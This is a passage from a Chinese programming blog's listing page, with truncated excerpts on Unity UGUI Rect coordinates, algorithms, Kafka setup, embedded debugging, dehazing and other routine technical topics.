x，y就是rect类的根坐标，有了它我们就能确定我们就能确定矩形的位置。我们写个小代码来确定一下它的根坐标到底在哪？
void Update() { if (Input.GetMouseButtonDown(0)) { Rect r=new Rect(0,0,200,200); print(r.Contains(Input.mousePosition)); } } 这时候我们点击我们屏幕的左下角，发现返回true，完全可以点击到。
对！其实就是这么简单，不要被官网的说明误导。它就是根坐标在左下角，根据width与height向右和向上画出来的一个矩形，但是还稍稍有点不太一样。
在UGUI中，transform.rect你得到的相关属性或许很会奇怪。接下来的例子我们都以transform.rect得到的值来讲解。
我们在界面中添加一个Image，他的锚点与pivot值都不变，具体如下图：
这时候他的长宽都是知道的。我们输出trans.rect.x与trans.rect.y会是什么呢？
结果是（-50，-50）,rect.size就是对x与y的包装。
因为rect的根是基于pivot的值来算的，把pivot的位置作为整个图形坐标的原点（0，0）。那么trans.rect的x与y因而所以就在第三象限为负值。
那么trans.rect.x与y的算法就是x=-width * pivot.x 和 y=-height * pivot.y。
下面用一张图来帮助理解。
验证代码
print("trans's rect x and y"+trans.rect.x+" "+trans.rect.y); print("caculate rect x and y"+-trans.rect.width*trans.pivot.x+" "+-trans.rect.height*trans.pivot.y); //trans.rect.position就是 x和y的封装 结果输出
举一反三
那么如果pivot改为（0.5，1），trans.rect的xy各是多少呢？还是一样的公式，此时整个坐标的原点到了图形最上面那一条边的中间了，trans.rect的xy为（-50，-100）。
总结：UGUI中rect的根坐标是基于pivot的位置来计算的。其他场景下的rect可以认为pivot为（0，0），那么rect的根坐标也就自然为（0，0）。
rect.min和rect.max
rect.min也就是(rect.x,rect.y)，表示左下角坐标也就是根坐标
rect.max就是（width+rect.x,height+rect.y),表示右上角坐标
同时rect.min=(rect.xMin,rect.yMin) rect.max(rect.xMax,rect.yMax)
（以下例子pivot为（0.5，0.5））
代码验证
print("trans's rect min and max"+trans.rect.min+" "+trans.rect.max); print("caculate rect min and max"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5cd3171d18e785916789ee61323b259/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/792343148a238c209b2704524a758f10/" rel="bookmark">
			继电器连接方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做个接继电器的笔记：
有这种已经搞好继电器驱动的：
这种的：
一端是：NC、COM、NC
另一端是：DC+、IN、DC-
DC±就按照继电器的规格接通电源，IN是信号输入端，可能是高电平触发也可能是低电平触发 ，上图的这个可以选择 ，自己连接跳线帽自己选择。
COM是公共端，它和其中一个NC是常通的 ，也就是一直是导通的 连接在一起；和另一个是常闭的，也就是没有物理连接，只要有触发信号之后，常通的断开，常闭的导通，这时就达到一个弱电控强电的作用了。
要如何连接嘞？
是我这个灵魂画手表现的时候了！！！
也有这种只有个继电器的端子的：
贴上一个驱动电路，亲测能用：
连接方法同上，这时一个高电平触发的驱动电路
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97a8fe003e6fe621393d8a3f282000e2/" rel="bookmark">
			二分法的边界问题详细分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二分法中最痛苦的问题：确定边界条件。
下面从一个最简单的例子说起：
LeetCode 704. 二分查找
class Solution: def search(self, nums: List[int], target: int) -&gt; int: left, right = 0, len(nums) # 确定左右边界 while left &lt; right: # 终止条件 mid = left + (right-left)//2 #得到中间点 if nums[mid] == target: return mid # 收缩可行的区间 if nums[mid] &lt; target: left = mid+1 else: right = mid return -1 上面是二分法的标准流程：
确定左右边界，[left, right)确定终止条件获得中点根据比较的值，收缩可行的区间 1、确定左右边界 一个 n n n长有序序列的最小索引是 0 0 0，最大索引是 n − 1 n-1 n−1。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97a8fe003e6fe621393d8a3f282000e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94ee643cb7eba2f57c7f0bcaa1378fd6/" rel="bookmark">
			最短路算法（3种算法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.最短路 最短路，顾名思义，最短的路径。我们把边带有权值的图称为带权图。边的权值可以理解为两点之间的距离。一张图中任意两点之间会有不同的路径相连。最短路径就是指连接两点的这些路径中最短的一条。我们有四种算法可以有效地解决最短路径问题，但是当出现负边权时，有些算法不适用。
2. Floyd算法（解决多源最短路径）：时间复杂度O(n^3), 空间复杂度(n^2) 推荐一篇博客。写的非常易懂：Floyd
分类：多源最短路径算法。作用：1.求最短路。 2.判断一张图中的两点是否相连。优点：实现极为简单缺点：只有数据规模较小且时空复杂度都允许时才可以使用
= 思想：3层循环，第一层枚举中间点k，第二层与第三层枚举两个端点i，j。若有dis[i][j] &gt; dis[i][k] + dis[k][j] 则把dis[i][j]更新成dis[i][k] + dis[k][j]（原理还是很好理解的）。实现：
(a)初始化：点i，j如果有边相连，则dis[i][j] = w[i][j]。如果不相连，则dis[i][j] = 0x7fffffff（int极限值），表示两点不相连（或认为相隔很远）。
(b)算法代码： for(int k = 1; k &lt;= n; k++) //枚举中间点（必须放最外层） for(int i = 1; i &lt;= n; i++) //枚举端点i if(i != k) for(int j = 1; j &lt;= n; j++) //枚举端点j if(i != j &amp;&amp; j != k &amp;&amp; dis[i][j] &gt; dis[i][k] + dis[k][j]) dis[i][j] = dis[i][k] + dis[k][j]; 完整代码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94ee643cb7eba2f57c7f0bcaa1378fd6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d32a18fc7177fc4114bc977adb9f1848/" rel="bookmark">
			软件工程 | 第三章 需求分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件工程 系列为本学期（2020春季）软件工程以及软件工程实践课程笔记整理~
明天醒来又是新的一周，从软件工程开始。。。 目录
一、可行性分析
二、需求分析--&gt;决定软件产品质量的关键
三、需求诱导--&gt;将用户真正需求挖掘出来
四、结构化分析方法(Structured Analysis SA)
1.结构化分析方法
2.结构化需求分析技术
五、软件快速原型实现
六、需求评审
UML 图形整理 软件项目计划：软件过程的开始、重要的环节--&gt;基础是对用户需求有足够的明晰的认识。 一、可行性分析 项目的成功与否取决于多种因素，包括社会因素、认为因素以及技术因素等等，可行性分析是其中的重要因素之一。可行性分析的内容--&gt;软件产品技术路线、软件成本和效益分析、软件风险的量化分析、可重用构件技术分析可行性分析的四个要素 经济：维护阶段的费用、项目扩展的收益技术：给定时间完成功能、软件性能是否有保障、是否允许引进新技术环境：市场与政策（法律、知识产权）人：综合特质（流动 开发、配合、协调领导能力等） 二、需求分析--&gt;决定软件产品质量的关键 1.需求分析的任务
功能需求分析：系统必须提供的服务性能需求分析：速度、效率、反应时间等质量需求外部接口需求出错处理需求约束条件未来扩展需求：功能、网络扩展等内容 2.需求分析的基本原则
(1)表达和理解问题的信息域
(2)建立描述系统信息、功能和行为的模型
(3)对系统模型按照一定形式分解
(4)分清系统的逻辑视图和物理视图
逻辑视图：系统要达到的功能和要处理的信息之间的关系 与实现细节无关
物理视图：处理功能和信息结构的实际表现形式 与实现细节有关 3.需求分析过程
目标认定：必须完成的功能、性能要求、有无外部接口等分析和综合：进行需求确认 保证需求的正确性、一致性和无歧义性需求建模：建立功能模型、行为模型和数据模型需求规格说明书：需求分析阶段的最终产物需求评审变更 三、需求诱导--&gt;将用户真正需求挖掘出来 规约技术 面向团队的需求获取技术软件开发人员、客户--&gt;需求分析团队用于分析和规约的早期阶段，是需求分析的主流技术质量功能部署--&gt;最大限度让用户满意 强调 正常、期望、令人振奋 三类需求USE—CASE--&gt;参与者和系统的交互方式 四、结构化分析方法(Structured Analysis SA) 1.结构化分析方法 （1）面向数据流的需求分析方法 适合分析大型的数据处理系统
（2）基本思想：
分解--&gt;对于复杂的系统，将大问题分解为若干小问题，然后对小问题分别求解抽象--&gt;先考虑问题最本质的属性 暂把细节略去，以后再逐层添加细节，直至涉及到最详细的内容。利用最本质的属性表示一个系统的方法为抽象 （3）特点
本质上是借助模型实现需求分析的一种活动模型： 数据模型--&gt;实体关系图功能模型--&gt;数据流图行为模型--&gt;状态转换图数据字典 结构化分析的过程就是要创建数据模型、功能模型和行为模型。
2.结构化需求分析技术 （1）实体关系图（Entity Relation Diagram,ERD）
描述数据对象、属性、对象间关系 以实体、关系、属性三个基本概念概括数据的基本结构数据对象：被软件所标识的具有一系列属性的抽象信息 每个数据对象的实体被唯一标识对象属性：实体具有的特性对象间关系1:1 1:N N:M （2） 数据流图(data flow diagram,DFD) 应用于数据驱动的系统
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d32a18fc7177fc4114bc977adb9f1848/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f24ff2b8f3848bc4b32d12d2a90cc033/" rel="bookmark">
			ESP8266烧写固件提示等待上电
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境 供电电压：5V 模块：正点原子ATK-ESP-01 usb转ttl：正点原子探索者开发板自带的ch340 PC：win10 烧写工具：ESPFlashDownloadTool_3.6.4 问题：烧写固件时提示等待同步上电
解决：烧录之前先复位
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64c00c71cc59593ec72fafca49afa295/" rel="bookmark">
			ADI射频电路计算小工具ADIsimRF介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做射频收发组件的同志都知道，设计一个模块的工作量之大，而且各种计算相当繁琐，每一个链路当中有各种指标需要设计阶段即满足指标而且留有余量。这就要求设计人员有相当的水平和资历了，所以很多大的项目都是些资深设计师做的。
新手或者工作资历尚浅的只能做做简单的了。当然还有一些强大的软件帮助我们，但是那些软件操作麻烦，组件太多，确实不适合新手快速上手。今天我们就来分享一个时候我们初学者使用的链路计算小软件。
这介绍一个射频小软件，自己猜猜？评论区揭晓答案。相信很多人也了解过，这个小软件简单易懂，根据需要可以增减器件，最高可到20阶。参数基本上包含了我们常用的各种指标，比如频率，带宽，增益，噪声，三阶交调等等。主要界面简洁如下图：
软件内部集成了ADI自己的很多器件型号，参数，比如放大器，开关，功分器，数控衰减器之类的，可根据方案进行器件选型，并填入对应指标。
另外，软件内还集成一个各种常用单位换算的小工具，像功率，电压，回波耗损和驻波比之间的换算就不用手动计算了，虽然这些工作也有很多小软件可以，但是集成在一个软件里面就不用来回切换各种软件了，确实还是方便一些。
如果我们把一个链路设计完成，还可以通过软件的仿真计算出结果，通过图形明确看到指标的变化情况。这个就方便我们调整链路方案，优化设计，不至于投板之后再调试阶段修改那就麻烦了。
以上就是对链路小软件的介绍了，软件操作大家可以下载下来试一试，用起来非常简单便捷。试想一下，如果我们的产品调试阶段某个指标不够，需要在链路里面在加一级或者减一级器件，这时候就不能直接操作了，可能会引起其他指标的变化。那我们用这个软件算一下，在哪个位置加了东西，会不会引起其他连锁反应就一目了然了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdf84d35e6ae55304b0fe9fc57d75e4f/" rel="bookmark">
			深度学习中训练集验证集测试集的区别以及常见的数据集划分原则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通常在深度学习中将数据集划分为训练集、验证集和测试集
训练集：相当于教材或例题，训练集在我们的模型过程中起的作用就是更新模型的参数，用以获得更好的性能，其行为表现就是让我们以为模型掌握了相关的知识（规律）。
验证集：相当于模拟考试，只是你调整自己状态的指示器，这种调整的结果（从模拟考到高考），有可能更好，也有可能更糟糕。验证集的存在是为了从一堆可能的模型中，帮我们选出表现最好的那个，可用来选超参数。
测试集：相当于高考，其特点是一考定终身，不给改的机会。训练集用来评估模型最终的性能；当多个模型进行对比试验验证模型性能时，多个模型应该在相同的测试集上面进行对比，这样才有效。就好比甲做A地区的卷子考了600分，乙做B地区的卷子考了590分，能不能说甲比乙成绩高，答案是不能。此外，请勿对测试数据进行训练。 如果评估指标取得了意外的好结果，则可能表明不小心对测试集进行了训练。例如，高准确率可能表明测试数据泄露到了训练集。
常见的划分原则有：交叉验证法、留出法。
一、K折 交叉验证 交叉验证是将数据集D划分成k个大小相似的互斥子集，每次都用其中k-1个子集的并集作为训练集，余下那个子集作为测试集。这样就会有k次划分，k次训练。最终结果是返回k个测试结果的均值。通常把交叉验证法称为“k折交叉验证”，k最常用的取值是10，此时称为10折交叉验证。
步骤：
（1）不重复抽样，将原始数据随机划分为k份
（2）每次挑选其中1份作为测试集，剩余k-1份作为训练集
（3）重复第二步 k 次，这样每个子集都有一次机会作为测试集，其余机会作为训练集
（4）计算 k 组测试结果的平均值作为模型精度的估计，并作为当前 k 折交叉验证下模型的性能指标
下图展示了5折交叉验证的训练示意图
K的取值：
（1）数据量小的时候，k可以设大一点，这样训练集占整体比例就比较大，不过同时训练的模型个数也增多。
（2）数据量大的时候，k可以设小一点。
k折验证的目的包括特征选取、模型选取、还是调参 二、留出法 留出法是将数据集D划分成两个互斥集合，为了尽可能保持数据分布的一致性，通常使用分层采样的方式，以7：3的比例划分训练集和测试集。单次使用留出法得到的结果往往不够稳定可靠，不同的训练集测试集划分会导致模型评估标准不同，一般都会进行多次随机划分，例如100次试验评估就会得到100个结果，留出法取这100个结果的平均。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b02b0f6a9f2d1afa2ba018e659d83c41/" rel="bookmark">
			暗通道去雾法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、算法背景 暗通道先验去雾算法是大神何恺明2009年发表在CVPR上的一篇论文，还获得了当年的CVPR最佳论文。
根据论文的介绍，暗通道去雾算法是基于一个关键的观察：在没有雾霾的室外图像中，大多数局部区域包含一些像素，这些像素在至少一个颜色通道中具有非常低的强度(原文：It is based on a key observation - most local patches in haze-free outdoor images contain some pixels which have very low intensities in at least one color channel)。因此，基于这个先验知识，可以直接评估出雾霾的厚度，并恢复出高质量的图像，同时还能得到高质量的深度图。
在计算机视觉领域，对于雾霾图像的模型定义为：
这个模型可以这样理解，I表示带有雾霾的图像，J表示没有雾霾的图像，t表示透射率，描述了光通过介质投射到摄像头过程中没有被散射的部分,A表示全局大气光照。公式的第一项叫做直接衰减项(direct attenuation)，用来描述图像场景中，光在介质中经过衰减的部分；第二项表示大气光照(airlight)，它由图像采集装置前方的散射引起，会导致景物色调的偏移。当大气是均匀的时候，透射率t可以表示为如下公式：
其中β是大气的散射系数。这个公式表明，随着景深的增加，场景的亮度呈指数衰减。
所以，从图像处理的角度讲，雾霾图像模型表示，在RGB颜色空间中，向量A、I、J是共面且终点是共线的，如下图所示：
所以，透射率t就可以表示为：
其中，c ∈ {r, g, b}，表示图像颜色通道的下标。
算法提出的背景模型如此，暗通道去雾算法则是在这个模型上，提出了一个新的先验知识-暗通道先验，从户外雾霾图像中直接估算透射率t。在知乎上看到一张图有点意思哈，应该可以帮助理解，作者见水印：
二、算法原理 2.1 算法提出 暗通道先验法是基于一个观察结果：在大多数非天空的区域中，至少有一个颜色通道在某些像素处具有非常低的强度。换句话说，这样一个区域中的最小强度值应该非常低，所以对于一幅图像J，定义了其暗通道去雾算法的模型：
其中，Jc表示无雾图像J三个颜色通道的暗原色，Ω(x)表示以x为中心的局部区域块，作者的观察发现，除了天空区域，Jdark的强度是非常低、趋于0的，Jdark叫做无雾图像J的暗通道,上面的这个观察叫做暗通道先验法。
论文提到，暗通道的低强度的原因主要有三个：a)、阴影，如城市景观图像中的汽车、建筑物和窗户内部的阴影，或景观图像中的树叶、树木和岩石的阴影等；b)、有颜色的物体或者其表面，任何颜色通道中缺少颜色的对象（例如，绿草/树/植物、红色或黄色的花/叶、蓝色的水面）都会导致暗通道中的值较低；c)、深色物体或表面，深色树干和石头等。由于自然的室外图像通常充满阴影和色彩，这些图像的暗通道真的很暗！
作者收集了很多图像并计算了他们的暗通道图像，如下：
可以看到，暗通道中大约75%的像素值为零，90%的像素强度低于25，大多数暗通道的平均亮度都很低，这意味着只有一小部分室外无霾图像偏离了暗通道先验理论。
2.2 透射率估算 论文给出的透射率t的计算公式如下：
其中，ω的值是基于应用的，论文中所有实验的值取0.95。这部分的推导如下：
首先假设大气光A是给定的、局部区域Ω(x)也是恒定的，对雾霾图像模型取最小值操作(注意这里是对三个通道独立操作)：
等价于
对上式三个通道图像取最小值操作，得到：
根据暗通道先验理论，Jdark是趋于0的：
而Ac是一个正数，所以可以表示为：
最后，推导得到：
事实上， 是归一化的雾霾图像的暗通道，它直接给出了透射率的估值。暗通道先验法对于天空区域而言不是好的先验模型，但天空的颜色通常与雾霾图像中的大气光A非常相似，所以在天空区域有：
由于天空是无限的并且趋向于零传输，所以不需要事先分离天空区域，可将其与非天空区域的处理等同。同时，论文还引入常数ω（0&lt;ω≤1），为了让处理结果看起来更自然一些，理由是现实生活中，即使是晴天白云，空气中也会存在一些颗粒，看远方的物体还是能够感觉到雾的影响，另外，雾的存在可以让人们感觉到景深的存在，所以需要保留一部分的雾：
2.3 软抠图(Soft Matting) 作者注意到雾模型公式与图像抠图(抠图…怪怪的翻译)方程形式比较类似，所以才采用了软抠图算法来优化透射率。首先用t(x)来表示精确的透射率，那么估算的透射率与之差值为：
其中，L表示抠图拉普拉斯矩阵(the Matting Laplacian matrix)，而λ是一个正则化参数，上式的第一项是一个平滑项，第二项是一个数据项，L矩阵的第(i,j)项定义为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b02b0f6a9f2d1afa2ba018e659d83c41/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ae1a2da80ce1c468a9682706323a087/" rel="bookmark">
			Kafka与传统消息队列优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Kafka Kafka是最初由Linkedin公司开发，是一个分布式、支持分区的（partition）、多副本的（replica），基于zookeeper协调的分布式消息系统。
Java和Scala编程语言编写消费模式：pull高吞吐量、低延迟：kafka每秒可以处理几十万条消息，它的延迟最低只有几毫秒可扩展性：kafka集群支持热扩展持久性、可靠性：消息被持久化到本地磁盘（zero-copy机制），并且支持数据备份防止数据丢失高并发：支持数千个客户端同时读写顺序保证：数据处理的顺序都很重要。大部分消息队列本来就是排序的，并且能保证数据会按照特定的顺序来处理。每一个Partition内的消息的有序性配合ZooKeeper分布式，Broker、Producer、Consumer都原生自动支持分布式，自动实现负载均衡； 2. 应用场景 异步处理 (将消息存储，异步处理)系统解耦（降低系统之间耦合度）流量削峰（抢购秒杀）日志搜集（大量日志搜集工作）… 3. 安装kafka 使用docker安装
zookeeper： wurstmeister/zookeeper kafka集群
kafka: wurstmeister/kafka Broker服务器节点
kafka-manager: sheepkiller/kafka-manager kafka可视化平台
version: '3' services: zookeeper1: image: wurstmeister/zookeeper container_name: kafka-zookeeper1 hostname: zookeeper1 ports: - "2181:2181" networks: - kafka_net environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=0.0.0.0:2888:3888 kafka1: image: wurstmeister/kafka container_name: kafka-kafka1 hostname: kafka1 ports: - "9092:9092" depends_on: - zookeeper1 environment: KAFKA_BROKER_ID: 1 KAFKA_ADVERTISED_HOST_NAME: 192.168.1.105 #宿主机IP KAFKA_MESSAGE_MAX_BYTES: 2000000 KAFKA_CREATE_TOPICS: "Topic1:1:3,Topic2:1:1:compact" KAFKA_ZOOKEEPER_CONNECT: zookeeper1:2181 JVM_XMS: "256M" JVM_XMX: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ae1a2da80ce1c468a9682706323a087/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/027708b8ca901787953164a0edbcc6cb/" rel="bookmark">
			Django版本与Python版本兼容对照表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python环境与Django版本存在对应关系，若版本不对应，则会有存在兼容性问题，如在Python3.7中创建Django1.11的时候就因为版本不对应产生语法错误。
Python环境与Django版本对应表：
Django versionPython versions1.52.6.5, 2.7, 3.2, 3.3.1.62.6, 2.7, 3.2, 3.31.72.7, 3.2, 3.3, 3.4 （2.6 不支持了）1.8 LTS2.7, 3.2, 3.3, 3.4, 3.5 （长期支持版本 LTS)1.92.7, 3.4, 3.5 （3.3 不支持了）1.102.7, 3.4, 3.51.11 LTS2.7, 3.4, 3.5, 3.6 （最后一个支持 Python 2.7 的版本 ）2.03.4, 3.5, 3.6 （注意，不再支持 Python 2）2.13.5, 3.6, 3.72.2 LTS3.5, 3.6, 3.73.03.6, 3.7, 3.8 更详细的可以参考这里，一般来说，无论学习还是做项目，选择长期支持版本（LTS）比较好。
使用最新版本的问题就是，可能要用到的一些第三方插件没有及时更新，无法正常使用这些三方包。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afe0ecb81ebefc6236353255abe6aaf6/" rel="bookmark">
			C语言验证哥德巴赫猜想
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		验证“哥德巴赫猜想”：
数学领域著名的“哥德巴赫猜想”的大致意思是：任何一个大于2的偶数总能表示为两个素数之和。比如：24=5+19，其中5和19都是素数。本实验的任务是设计一个程序，验证20亿以内的偶数都可以分解成两个素数之和。
输入格式：
输入在一行中给出一个(2, 2 000 000 000]范围内的偶数N。
输出格式：
在一行中按照格式“N = p + q”输出N的素数分解，其中p ≤ q均为素数。又因为这样的分解不唯一（例如24还可以分解为7+17），要求必须输出所有解中p最小的解。
输入样例：
24 输出样例：
24 = 5 + 19 源代码如下：
#include &lt;stdio.h&gt; #include &lt;math.h&gt; int prime(int n)	//定义函数判断素数 { if(n==2) return 1; for(int i=2; i&lt;=sqrt(n); i++)	//将i的取值缩小到2~√n,提高代码运行效率 { if(n%i==0) return 0; } return 1; } int main() { int N; scanf("%d",&amp;N); for(int i=2; i&lt;=N/2; i++)	//取i&lt;=N/2可有效减少循环次数 { if(prime(i) &amp;&amp; prime(N-i)) { printf("%d = %d + %d\n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afe0ecb81ebefc6236353255abe6aaf6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30d311513d721065c5abbbcc1eeb33c4/" rel="bookmark">
			Office：Word 打字非常卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、更改 Word 默认存盘路径
2、删除 Word 临工文件，清理缓存
（1）单击“开始”，然后单击“运行”。在框中键入 regedit，打开注册表；
（2）找到注册表项：HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Word； （3）然后选中 Data 目录，删除 Data 目录；
（4）退出注册表，重新启动Word。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42c799ef010a4bd62f9d212908b4d4ab/" rel="bookmark">
			大数据与数据库的关系和区别 是什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 首先回答你的第一个问题：大数据和数据库没有关系。大数据一般用于分析数据，一般只做查询，不修改数据，现在比较流行的框架有Hadoop和Spark；数据库，传统上是指关系型数据库，比如Oracle和MySQL，这种数据侧重于事务的处理。第二个问题：学习大数据，比如Hadoop，只需要了解Java语言，即可。不需要对关系型数据库有多深入的了解。但了解一些，对于学习大数据也是有帮助的。 大数据和数据库没什么必然关系，大数据简单粗糙的说就是海量数据。数据库只是存储数据的。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22789428cbd511053f8cbe962e3958b1/" rel="bookmark">
			Tableau学习8——范围-线图、倾斜图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.范围-线图 1.1概念与用途 范围-线图将整体数据的部分统计特征（均值、最大值、最小值等）展示在图形中，既可以说明群体特征，还可以展示个体信息，更可以比较个体与整体的相对关系。
1.2创建范围-线图 同样的方式，创建最大值、最小值
***
2.倾斜图 劳动生产率变化倾斜图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdaaab2a6dd35eb01e9017b229404b94/" rel="bookmark">
			S32K144之PEMicro  multilink调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		S32K144之PEMicro multilink调试 multilink是个很强大的调试工具，支持对各种NXP微控制器系列的调试访问。不仅支持NXP，multilink还能支持到其他厂商的ARM内核的MCU，下图是在multilink使用手册的截图，罗列了支持的微控制器系列。
下面我们来介绍一下使用multilink调试S32K144的大致步骤与注意事项：
1、安装驱动
如果你安装了Codewarrior或者是PEmicro的软件安装包，这个驱动是默认安装的。安装S32DS会有选项提示你是否安装，具体可以去桌面左下角的所有应用查一下。如果没有，到http://www.pemicro.com，support的Documentation &amp; Downloads进行下载。
2、更换固件
multilink支持不同的芯片需要换里边的固件，到PE的安装路径打开Firmware Updater Utility软件，选择ARM内核。
3、选择调试端口
在用户使用手册中可以查找到支持S32K144的端口，可以选择port B、port F和port G端口进行调试，需要注意的是，在手册中出现了这样一句话：
The USB Multilink Universal and Universal FX interfaces will work with targets whose processor power supply is in the range of1.8V to 5V.
所以我们需要把multilink的TVCC接到S32K144开发板的3.3V或者5V，如不接就会导致下载失败。我们使用Jlink时是可以不接的，所以初次使用时估计会有人和我一样不接TVCC，然后在别的地方各种排查问题。
如接线正确，multilink的右上角的小黄灯会亮起。
4、S32DS debug
回到S32DS ID进行调试下载，debug界面选择相应PEMicro的elf文件，如没有双击GDB PEmicro intreface debugging。在Debugger菜单栏中选择S32K144芯片，然后注意一下GDB client setting菜单栏，有时候会默认到此路径，如不是改成如图所示路径，不然会提示 Error while launching command: --version这样的错误，造成debug失败。
至此，就可以使用multilink对S32K144进行调试下载了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/697b08307dd8ae2700bdf1189f04f0ba/" rel="bookmark">
			蓝桥杯 算法训练 逆序对
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		资源限制
时间限制：1.0s 内存限制：256.0MB
问题描述
Alice是一个让人非常愉跃的人!他总是去学习一些他不懂的问题，然后再想出许多稀奇古怪的题目。这几天，Alice又沉浸在逆序对的快乐当中，他已近学会了如何求逆序对对数，动态维护逆序对对数等等题目，他认为把这些题让你做简直是太没追求了，于是，经过一天的思考和完善，Alice终于拿出了一道他认为差不多的题目：
有一颗2n-1个节点的二叉树，它有恰好n个叶子节点，每个节点上写了一个整数。如果将这棵树的所有叶子节点上的数从左到右写下来，便得到一个序列a[1]…a[n]。现在想让这个序列中的逆序对数量最少，但唯一的操作就是选树上一个非叶子节点，将它的左右两颗子树交换。他可以做任意多次这个操作。求在最优方案下，该序列的逆序对数最少有多少。
Alice自己已近想出了题目的正解，他打算拿来和你分享，他要求你在最短的时间内完成。
输入格式
第一行一个整数n。
下面每行，一个数x。
如果x=0，表示这个节点非叶子节点，递归地向下读入其左孩子和右孩子的信息，如果x≠0，表示这个节点是叶子节点，权值为x。
输出格式
输出一个整数，表示最少有多少逆序对。
样例输入
3
0
0
3
1
2
样例输出
1
数据规模与约定
对于20%的数据，n &lt;= 5000。
对于100%的数据，1 &lt;= n &lt;= 200000，0 &lt;= a[i]&lt;2^31。
#include&lt;stdio.h&gt; #define N 200010//定义总的节点个数 long long ans = 0;//保存调整前后最小的逆序对数 int n,val,index=1;//n有效节点数，index为有效节点下标，val临时输入的值 //S保存的是以i为根节点的有效节点数目，left为i的左子树，right为i的右子树,key表示i的键值 int S[N],left[N],right[N],key[N]; int rRotate(int t){//对t节点进行右旋转 int tem = left[t]; left[t] = right[tem]; right[tem] = t; S[t] = S[left[t]]+S[right[t]]+1;//修改其根节点的有效节点个数 S[tem] = S[left[tem]]+S[right[tem]]+1; return tem;//返回调整后的根节点 } int lRotate(int t){ int tem = right[t]; right[t] = left[tem]; left[tem] = t; S[t] = S[right[t]]+S[left[t]]+1; S[tem] = S[right[tem]]+S[left[tem]]+1; return tem; } int adjust(int t,int flag){//根据flag来进行何种调整(flag不能使用bool类型，c没有bool类型) if(flag){ if(S[left[left[t]]]&gt;S[right[t]] || S[right[left[t]]]&gt;S[right[t]]){ if(S[right[left[t]]]&gt;S[right[t]]){ left[t] = lRotate(left[t]); } return rRotate(t); } }else{ if(S[right[right[t]]]&gt;S[left[t]] || S[left[right[t]]]&gt;S[left[t]]){ if(S[left[right[t]]]&gt;S[left[t]]){ right[t] = rRotate(right[t]); } return lRotate(t); } } return t;//如果都不满足，直接返回其原先节点 } int insert(int t,int node){ S[t]++;//t节点数增加1 if(key[node]&lt;key[t]){//根据node的值决定插入到t的左子树还是右子树 if(left[t]==0){//如果左子树为空，直接接到左子树上 left[t]=node; }else{//否则递归插入到左子树上 left[t] = insert(left[t],node); } }else{ if(right[t]==0){ right[t]=node; }else{ right[t] = insert(right[t],node); } } return adjust(t,key[node]&lt;key[t]);//插入节点后要对平衡二叉树进行调整 } int rank(int t,int val){//求val在以t为根节点的排名，就是求出小于val的节点个数 if(t==0)return 0;//如果节点为空，则返回0 if(val&gt;=key[t]){ return rank(right[t],val); }else{ return rank(left[t],val)+1+S[right[t]]; } } int merge(int node,int 